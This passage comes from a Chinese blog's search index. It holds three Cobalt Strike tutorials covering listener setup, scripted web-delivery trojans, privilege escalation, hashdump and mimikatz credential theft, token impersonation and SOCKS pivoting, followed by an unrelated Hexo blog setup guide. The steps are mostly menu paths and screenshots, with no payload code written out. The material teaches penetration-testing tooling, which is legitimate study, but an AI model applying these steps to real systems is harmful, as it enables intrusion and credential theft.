title="jobs"></a>jobs</h4><blockquote><p>列出当前做的事情</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-jobs.png" alt="image-20220315100643423"></p><h4 id="screenshot"><a href="#screenshot" class="headerlink" title="screenshot"></a>screenshot</h4><blockquote><p>可以截肉鸡上的图，在View-&gt;Screenshots里可以查看截图</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-screenshot.png" alt="image-20220315101243187"></p><h3 id="后渗透模块"><a href="#后渗透模块" class="headerlink" title="后渗透模块"></a>后渗透模块</h3><blockquote><p>后渗透模块可以帮助进行信息搜集，权限提升，端口扫描，横向移动，持久化等操作</p></blockquote><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><blockquote><p>一键提权</p><p>右键肉鸡-&gt;Access-&gt;Elevate</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-Elevate.png" alt="image-20220315102321330"></p><blockquote><p>完成之后会多出一些东西，从Administrator提权到System权限</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-elevate2.png" alt="image-20220315102432952"></p><p><img src="/2022/03/14/cs-beacon/cs-system.png" alt="image-20220315102517329"></p><blockquote><p>getsystem也可以完成操作</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-getsystem.png" alt="image-20220315102907401"></p><blockquote><p>hashdump</p><p>获取用户密码的hash值，获得hash之后可以使用彩虹表破解</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-hash.png" alt="image-20220315103052711"></p><blockquote><p>shell net user</p><p>查看靶机用户</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-netuser.png" alt="image-20220315103220373"></p><h4 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h4><blockquote><p>run mimikatz</p><p>右键肉鸡-&gt;Access-&gt;Run mimikatz</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-mimikatz.png" alt="image-20220315103447825"></p><blockquote><p>相当于直接在客户机上运行mimikatz</p></blockquote><h4 id="伪造用户"><a href="#伪造用户" class="headerlink" title="伪造用户"></a>伪造用户</h4><blockquote><p>可以通过make token伪造用户</p><p>右键肉鸡-&gt;Access-&gt;Make Token</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-maketoken.png" alt="image-20220315103935772"></p><blockquote><p>相当于这两条命令</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-maketoken2.png" alt="image-20220315104055423"></p><blockquote><p>可以通过模拟的用户去做一些奇怪的事情</p></blockquote><h4 id="文件列表"><a href="#文件列表" class="headerlink" title="文件列表"></a>文件列表</h4><blockquote><p>右键肉鸡-&gt;Explore-&gt;File Browser</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-file.png" alt="image-20220315104244088"></p><p><img src="/2022/03/14/cs-beacon/cs-file2.png" alt="image-20220315104512887"></p><h4 id="Net-View"><a href="#Net-View" class="headerlink" title="Net View"></a>Net View</h4><blockquote><p>可以查看内网中的主机</p><p>右键肉鸡-&gt;Explore-&gt;Net View</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-netview.png" alt="image-20220315183759918"></p><h4 id="Process-List"><a href="#Process-List" class="headerlink" title="Process List"></a>Process List</h4><blockquote><p>查看目标有哪些进程，可以注入进程</p><p>右键肉鸡-&gt;Explore-&gt;Process List</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-process.png" alt="image-20220315183935112"></p><h4 id="SOCKS-Server"><a href="#SOCKS-Server" class="headerlink" title="SOCKS Server"></a>SOCKS Server</h4><blockquote><p>设置代理</p><p>右键肉鸡-&gt;Pivoting-&gt;SOCKS Server</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-sock.png" alt="image-20220315184058658"></p><blockquote><p>然后在View-&gt;Proxy Pivots里查看</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-proxy.png" alt="image-20220315184301756"></p><blockquote><p>点击Tunnel可以通过这条命令在msf里设置代理，把流量引到socks里</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-Tunnel.png" alt="image-20220315184427676"></p><h4 id="Pivoting-Listener"><a href="#Pivoting-Listener" class="headerlink" title="Pivoting-Listener"></a>Pivoting-Listener</h4><blockquote><p>如果要打到内网，通过这个控制其他内网</p><p>右键肉鸡-&gt;Pivoting-&gt;Listener</p><p>连级控制</p></blockquote><p><img src="/2022/03/14/cs-beacon/cs-LIstener.png" alt="image-20220315184642336"></p><h4 id="Spawn"><a href="#Spawn" class="headerlink" title="Spawn"></a>Spawn</h4><blockquote><p>模块派发shell，可以派发给团队其他人</p></blockquote><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs-mode</title>
      <link href="/2022/03/14/cs-mode/"/>
      <url>/2022/03/14/cs-mode/</url>
      
        <content type="html"><![CDATA[<h1 id="CS模块介绍"><a href="#CS模块介绍" class="headerlink" title="CS模块介绍"></a>CS模块介绍</h1><h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><h3 id="New-Connection"><a href="#New-Connection" class="headerlink" title="New Connection"></a>New Connection</h3><p>打开新的Connect窗口</p><h3 id="Preferences"><a href="#Preferences" class="headerlink" title="Preferences"></a>Preferences</h3><p>首选项</p><h3 id="Visualization"><a href="#Visualization" class="headerlink" title="Visualization"></a>Visualization</h3><p>将主机以不同权限展示出来</p><h4 id="Pivot-Graph"><a href="#Pivot-Graph" class="headerlink" title="Pivot Graph"></a>Pivot Graph</h4><h4 id="Session-Table"><a href="#Session-Table" class="headerlink" title="Session Table"></a>Session Table</h4><h4 id="Target-Table"><a href="#Target-Table" class="headerlink" title="Target Table"></a>Target Table</h4><h3 id="VPN-Interfaces"><a href="#VPN-Interfaces" class="headerlink" title="VPN Interfaces"></a>VPN Interfaces</h3><p>设置vpn接口</p><h3 id="Listeners"><a href="#Listeners" class="headerlink" title="Listeners"></a>Listeners</h3><p>创建监听器</p><h3 id="Script-Manager"><a href="#Script-Manager" class="headerlink" title="Script Manager"></a>Script Manager</h3><p>查看CNA脚本</p><h2 id="View"><a href="#View" class="headerlink" title="View"></a>View</h2><h3 id="Applications"><a href="#Applications" class="headerlink" title="Applications"></a>Applications</h3><p>显示被控电脑应用信息</p><h3 id="Credentials"><a href="#Credentials" class="headerlink" title="Credentials"></a>Credentials</h3><p>显示HashDump或者mimikatz获取密码</p><h3 id="Downloads"><a href="#Downloads" class="headerlink" title="Downloads"></a>Downloads</h3><p>查看从靶机中下载的文件</p><h3 id="Event-Log"><a href="#Event-Log" class="headerlink" title="Event Log"></a>Event Log</h3><p>主机上线记录</p><h3 id="Keystrokes"><a href="#Keystrokes" class="headerlink" title="Keystrokes"></a>Keystrokes</h3><p>键盘记录</p><h3 id="Proxy-Pivots"><a href="#Proxy-Pivots" class="headerlink" title="Proxy Pivots"></a>Proxy Pivots</h3><p>代理模块</p><h3 id="Screenshots"><a href="#Screenshots" class="headerlink" title="Screenshots"></a>Screenshots</h3><p>截图</p><h3 id="Script-Console"><a href="#Script-Console" class="headerlink" title="Script Console"></a>Script Console</h3><p>控制台，加载脚本</p><h3 id="Targets"><a href="#Targets" class="headerlink" title="Targets"></a>Targets</h3><p>显示目标</p><h3 id="Web-Log"><a href="#Web-Log" class="headerlink" title="Web Log"></a>Web Log</h3><p>web日志</p><h2 id="Attacks"><a href="#Attacks" class="headerlink" title="Attacks"></a>Attacks</h2><h3 id="Packages"><a href="#Packages" class="headerlink" title="Packages"></a>Packages</h3><p>攻击方式</p><h4 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a>HTML Application</h4><p>基于HTML应用的攻击载荷</p><h4 id="MS-Office-Macro"><a href="#MS-Office-Macro" class="headerlink" title="MS Office Macro"></a>MS Office Macro</h4><p>生成Office宏病毒</p><h4 id="Payload-Generator"><a href="#Payload-Generator" class="headerlink" title="Payload Generator"></a>Payload Generator</h4><p>payload生成器</p><h4 id="Windows-Executable"><a href="#Windows-Executable" class="headerlink" title="Windows Executable"></a>Windows Executable</h4><p>生成windows32或64位exe或dll木马</p><h4 id="Winodows-Executable-S"><a href="#Winodows-Executable-S" class="headerlink" title="Winodows Executable (S)"></a>Winodows Executable (S)</h4><p>生成windows32或64位exe或dll木马，完整</p><h3 id="Web-Drive-by"><a href="#Web-Drive-by" class="headerlink" title="Web Drive-by"></a>Web Drive-by</h3><h4 id="Manage"><a href="#Manage" class="headerlink" title="Manage"></a>Manage</h4><p>管理器，对上线肉鸡管理</p><h4 id="Clone-Site"><a href="#Clone-Site" class="headerlink" title="Clone Site"></a>Clone Site</h4><p>克隆指定网站样式</p><h4 id="Host-File"><a href="#Host-File" class="headerlink" title="Host File"></a>Host File</h4><p>指定文件夹在web里</p><h4 id="Scripted-Web-Delivery-S"><a href="#Scripted-Web-Delivery-S" class="headerlink" title="Scripted Web Delivery (S)"></a>Scripted Web Delivery (S)</h4><p>Web攻击模块</p><h4 id="Signed-Applet-Attack"><a href="#Signed-Applet-Attack" class="headerlink" title="Signed Applet Attack"></a>Signed Applet Attack</h4><p>使用java自签名的程序进行钓鱼攻击</p><h4 id="Smart-Applet-Attack"><a href="#Smart-Applet-Attack" class="headerlink" title="Smart Applet Attack"></a>Smart Applet Attack</h4><p>自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本</p><h4 id="System-Profiler"><a href="#System-Profiler" class="headerlink" title="System Profiler"></a>System Profiler</h4><p>客户端检测工具</p><h3 id="Spear-Phish"><a href="#Spear-Phish" class="headerlink" title="Spear Phish"></a>Spear Phish</h3><p>钓鱼邮件</p><h2 id="Reporting"><a href="#Reporting" class="headerlink" title="Reporting"></a>Reporting</h2><h3 id="0-Activity-Report"><a href="#0-Activity-Report" class="headerlink" title="0.Activity Report"></a>0.Activity Report</h3><p>活动报告</p><h3 id="1-Hosts-Report"><a href="#1-Hosts-Report" class="headerlink" title="1.Hosts Report"></a>1.Hosts Report</h3><p>主机报告</p><h3 id="2-Indicators-of-Compromise"><a href="#2-Indicators-of-Compromise" class="headerlink" title="2.Indicators of Compromise"></a>2.Indicators of Compromise</h3><p>IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashes</p><h3 id="3-Sessions-Report"><a href="#3-Sessions-Report" class="headerlink" title="3.Sessions Report"></a>3.Sessions Report</h3><p>会话报告</p><h3 id="4-Social-Engineering-Report"><a href="#4-Social-Engineering-Report" class="headerlink" title="4.Social Engineering Report"></a>4.Social Engineering Report</h3><p>社会工程报告：包括鱼叉钓鱼邮件及点击记录</p><h3 id="5-Tactics-Techniques-and-Procedures"><a href="#5-Tactics-Techniques-and-Procedures" class="headerlink" title="5.Tactics,Techniques,and Procedures"></a>5.Tactics,Techniques,and Procedures</h3><p>战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透随笔之cs</title>
      <link href="/2022/03/14/cs/"/>
      <url>/2022/03/14/cs/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobalt-Strike基本使用"><a href="#Cobalt-Strike基本使用" class="headerlink" title="Cobalt Strike基本使用"></a>Cobalt Strike基本使用</h1><h2 id="一、启动"><a href="#一、启动" class="headerlink" title="一、启动"></a>一、启动</h2><p>首先解压，里面有两个重要的文件</p><p><img src="/2022/03/14/cs/cs-file.png" alt="image-20220314154035456"></p><p>一个teamserver一个cobalstrike</p><p>不能用java直接打开，要通过启动器打开</p><h3 id="添加执行权限"><a href="#添加执行权限" class="headerlink" title="添加执行权限"></a>添加执行权限</h3><p>在文件夹内启动终端，然后输入</p><pre class=" language-linux"><code class="language-linux">chmod 777 ./*</code></pre><p>给当前目录下所有文件增加所有权限</p><h3 id="打开启动器"><a href="#打开启动器" class="headerlink" title="打开启动器"></a>打开启动器</h3><p>输入命令</p><pre class=" language-linux"><code class="language-linux">./teamserver [本机ip] (密码)</code></pre><p>键入本机ip地址和密码，启动</p><p><img src="/2022/03/14/cs/cs-login.png" alt="image-20220314155119789"></p><h3 id="启动cs"><a href="#启动cs" class="headerlink" title="启动cs"></a>启动cs</h3><p>打开一个新的窗体，输入</p><pre class=" language-linux"><code class="language-linux">./cobaltstrike</code></pre><p><img src="/2022/03/14/cs/cs-login2.png" alt="image-20220314155459646"></p><p>点击connect进入页面</p><h2 id="二、cs控制远程服务器"><a href="#二、cs控制远程服务器" class="headerlink" title="二、cs控制远程服务器"></a>二、cs控制远程服务器</h2><p><img src="/2022/03/14/cs/cs-main.png" alt="image-20220314160207965"></p><h3 id="新建Listeners"><a href="#新建Listeners" class="headerlink" title="新建Listeners"></a>新建Listeners</h3><blockquote><p>点击Cobalt Strike -&gt; Listeners</p></blockquote><p><img src="/2022/03/14/cs/cs-listeners.png" alt="image-20220314160519575"></p><blockquote><p>在下方点击Add</p></blockquote><p><img src="/2022/03/14/cs/cs-new%20listener.png" alt="image-20220314161144814"></p><blockquote><p>点击保存，监听器就打开了</p></blockquote><h3 id="新建木马程序"><a href="#新建木马程序" class="headerlink" title="新建木马程序"></a>新建木马程序</h3><blockquote><p>Attacks-&gt;Web Drive-by-&gt;Scripted Web Delivery (s) &#x2F;&#x2F;使用网站方式发布</p></blockquote><p><img src="/2022/03/14/cs/cs-web.png" alt="image-20220314162057152"></p><blockquote><p>将内容复制</p></blockquote><p><img src="/2022/03/14/cs/cs-copy.png" alt="image-20220314162204838"></p><blockquote><p>新建一个文本文档，放入进去保存，只要将这条命令在靶机内执行，就会完成控制</p></blockquote><p><img src="/2022/03/14/cs/cs-windows.png" alt="image-20220314162653079"></p><p><img src="/2022/03/14/cs/cs-success.png" alt="image-20220314163104461"></p><h3 id="与肉鸡互动"><a href="#与肉鸡互动" class="headerlink" title="与肉鸡互动"></a>与肉鸡互动</h3><blockquote><p>右键肉鸡-&gt;Interact</p></blockquote><p>打开命令行，输入shell whoami查看</p><p><img src="/2022/03/14/cs/cs-whoami.png" alt="image-20220314163643663"></p><blockquote><p>默认心跳时间60s</p></blockquote><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> cs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+Git搭建博客</title>
      <link href="/2022/03/13/Hexo-Git/"/>
      <url>/2022/03/13/Hexo-Git/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-git搭建博客"><a href="#Hexo-git搭建博客" class="headerlink" title="Hexo+git搭建博客"></a>Hexo+git搭建博客</h1><h2 id="一-准备工作"><a href="#一-准备工作" class="headerlink" title="一.准备工作"></a>一.准备工作</h2><h3 id="创建github账号"><a href="#创建github账号" class="headerlink" title="创建github账号"></a>创建github账号</h3><p>这个不用多说，跟着步骤注册，登录后进入仓库</p><p><img src="/2022/03/13/Hexo-Git/git-profile.png" alt="image-20220313150951882"></p><p>new一个新的仓库</p><p><img src="/2022/03/13/Hexo-Git/git-new.png" alt="image-20220313151149841"></p><p>名称填写，用户名加github.io,勾选readme.md</p><p><img src="/2022/03/13/Hexo-Git/git-repository.png" alt="image-20220313151402566"></p><h3 id="安装git，node-js"><a href="#安装git，node-js" class="headerlink" title="安装git，node.js"></a>安装git，node.js</h3><p><strong>Node.js下载地址：</strong><a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p><p><strong>Git：</strong><a href="https://git-scm.com/">https://git-scm.com/</a></p><p>安装完之后可以通过git bash here打开终端，然后查看版本，就算完成安装了</p><p><img src="/2022/03/13/Hexo-Git/git-v.png" alt="image-20220313152319832"></p><h2 id="二-安装、配置hexo"><a href="#二-安装、配置hexo" class="headerlink" title="二.安装、配置hexo"></a>二.安装、配置hexo</h2><p>新建一个文件夹，用于存放博客，打开Git bash here</p><p>使用npm命令安装Hexo，输入：</p><pre class=" language-git"><code class="language-git">npm install -g hexo-cli</code></pre><p>安装完成后运行</p><pre class=" language-git"><code class="language-git">hexo initnpm install</code></pre><h2 id="三-本地启动Hexo"><a href="#三-本地启动Hexo" class="headerlink" title="三.本地启动Hexo"></a>三.本地启动Hexo</h2><p>输入命令：</p><pre class=" language-git"><code class="language-git">hexo g #生成hexo s #启动本地服务器，默认是http://localhost:4000查看</code></pre><h2 id="四-将Hexo部署到github上"><a href="#四-将Hexo部署到github上" class="headerlink" title="四.将Hexo部署到github上"></a>四.将Hexo部署到github上</h2><h3 id="1-编辑根目录下-config-yml文件"><a href="#1-编辑根目录下-config-yml文件" class="headerlink" title="1.编辑根目录下_config.yml文件"></a>1.编辑根目录下_config.yml文件</h3><pre class=" language-yml"><code class="language-yml"># Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy:  type: git  repo: #仓库地址  branch: main</code></pre><h3 id="2-安装扩展"><a href="#2-安装扩展" class="headerlink" title="2.安装扩展"></a>2.安装扩展</h3><pre class=" language-git"><code class="language-git">npm install hexo-deployer-git --save</code></pre><h3 id="3-设置用户信息"><a href="#3-设置用户信息" class="headerlink" title="3.设置用户信息"></a>3.设置用户信息</h3><pre class=" language-yml"><code class="language-yml">$ git config --global user.name "注册时候的用户名"          $ git config --global user.email  "邮件地址@youremail.com"  </code></pre><h3 id="4-添加ssh-key到github上"><a href="#4-添加ssh-key到github上" class="headerlink" title="4.添加ssh key到github上"></a>4.添加ssh key到github上</h3><pre class=" language-yml"><code class="language-yml">ssh-keygen -t rsa -C "邮件地址@youremail.com"   # 生成Key   # 在 C:/User/username/.ssh/文件里面 ssh -T git@github.com # 测试我们的Key是否添加成功 </code></pre><h3 id="5-完成部署，上传"><a href="#5-完成部署，上传" class="headerlink" title="5.完成部署，上传"></a>5.完成部署，上传</h3><pre class=" language-git"><code class="language-git">hexo d</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="https://chengzhaoxi.xyz/212c0371.html">在Windows中使用Hexo</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
